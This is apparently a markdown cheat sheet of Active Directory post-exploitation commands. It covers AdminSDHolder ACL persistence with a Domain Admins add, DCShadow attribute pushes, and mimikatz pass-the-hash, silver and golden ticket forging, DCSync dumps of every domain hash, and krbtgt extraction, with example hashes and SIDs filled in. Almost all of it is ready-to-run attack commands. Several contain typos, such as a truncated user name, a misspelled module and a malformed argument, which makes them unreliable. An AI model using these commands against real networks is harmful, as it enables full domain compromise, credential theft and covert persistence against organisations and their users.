### AdminSDHolder Persistence
```
The User John has granted GenericAll Privilege.

Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Joh -Verbose -Rights All

#The Following could be verify whether The unprivilege user John has GenericAll rights on the AdminSDHolder.

Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'John'}

net group "domain admins" John /add /domain
```

###  DCShadow Persistence

DCShadow is persistence technique used by adversary that allow  an adversary to push unauthorized changes into the environment by modifying active directory objects. to carry out such a persistence technique two active administrative session is required.one of which has to be domain privilege session and one of another session has to be system privilege session where compromised box.
```
!processtoken
lsadump::dcshadow /object:MeMe /attribute:url /value:acmebank.local
lsadump::dcshadow /push

lsadump::dcshadow /object:John-PC$ /attribute:badpwdcount /value=7777
lsadump::dcshadow /push

```
### Mimikatz 

| Pass-the-Hash  |
| ------------- |
|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|

|Silver Tickets  |
| ------------- |
|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:ninja.corp  /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|

|Golden Tickets |
| ------------- |
|Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:evil /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|Invoke-Mimikatz -Command '"kerberos::golden /user:MeMe /domain:ninja.corp /sid: S-1-5-21-3107064655-183826745-1492997513 /krbtgt:a89f4db26e65cdf4bb6cb6c1a1990eec /ptt" '|
|kerbeos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:ninja.corp /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt|

|DCSync |
| ------------- |
|lsadump::dcsync /domain:pentestlab.local /all /csv|
|Invoke-Mimikatz -Command '"lsadump::dcsync /domain:insomnia.ninja.corp /all /csv"'|
|Invoke-Mimikatz -Command '"lsadump::dcsync /user:krbtgt"'|
|Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
